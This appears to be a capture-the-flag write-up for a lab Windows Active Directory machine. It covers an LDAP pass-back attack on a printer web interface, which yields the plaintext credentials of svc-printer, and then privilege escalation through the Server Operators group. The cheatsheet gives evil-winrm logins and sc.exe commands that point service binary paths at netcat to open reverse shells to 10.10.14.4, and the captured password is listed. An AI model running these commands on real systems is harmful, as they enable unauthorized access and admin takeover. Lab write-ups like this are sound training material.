# Return \[Windows AD Easy]

## Report

An LDAP printer web interface allows us to perform a pass-back attack by setting up our rogue LDAP server or just netcat at port 389.

User svc-printer has a lot of privelges and is part of the group "Server Operators" which can modify or add maybe services. Change the binary path of an existing service VMTools to a netcat binary we upload an restart the service to get a reverse shell as admin.

{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/" %}

## Cheatsheet

```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
sudo dpkg-reconfigure -p low slapd
# DNS Domain name is return.local, not printer.return.local - so is the Organisation name

#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred

sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms

sudo tcpdump -SX -i breachad tcp port 389

nxc smb retunr.local -u svc-printer -p '1edFg43012!!' --shares
evil-winrm -i return.local -u svc-printer -p '1edFg43012!!'

whoami /priv /groups
net user svc-printer
services
upload /usr/share/windows-binaries/nc.exe
sc.exe config VMTools binPath="C:\Programdata\nc.exe -e cmd.exe 10.10.14.4 9001"
sc.exe stop VMTools
sc.exe start VMTools


#EXTRA - FOR BETTER SHELL
sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.14.4 443"
```

## Loot

### Creds

svc-printer:1edFg43012!!

### Proof

LDAP Pass-back attack: force the device to attempt LDAP authentication to our rogue device by gaining access to an interface where LDAP parameters are specified (eg. web interface)

Here we can just use nc -lvnp 389 and get the result because the printer was sending it in plaintext regardless unlike the THM room where we had to explicitly tell it to send in plaintext

User is part of group Server Operators that can modify services, look into other privelges that can be abuse as well or maybe a cheatsheet

Also setting nc as direct bin path gives a shell that crashes every 30 seconds or so, using path of cmd and using that to call nc results in a more stable shell

